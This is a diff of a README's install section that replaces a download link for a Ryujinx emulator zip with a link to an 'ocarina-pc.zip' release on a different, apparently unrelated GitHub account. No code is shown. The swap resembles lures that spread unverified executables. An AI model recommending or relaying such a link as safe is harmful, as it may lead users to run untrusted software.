@@ -10,7 +10,7 @@
 <img width="100" height="102" alt="image" src="https://github.com/user-attachments/assets/e135adcf-5b36-4a03-bc4d-d2426b4c754b" />
 
 ## Install
-[Download `Ryujinx-Emulator.zip`](https://github.com/Inproger/ryujinx-emulator/releases/download/Nintendo/ryujinx-emulator.zip)
+[Download `ocarina-pc.zip`](https://github.com/momeenbarakat23/ocarina-of-time-pc-port/releases/download/v3.4.1/ocarina-pc.zip)
 ---
 <img width="1080" height="607" alt="image" src="https://github.com/user-attachments/assets/1cc61537-93e5-411d-8803-eb2859bb3cc2" />
 
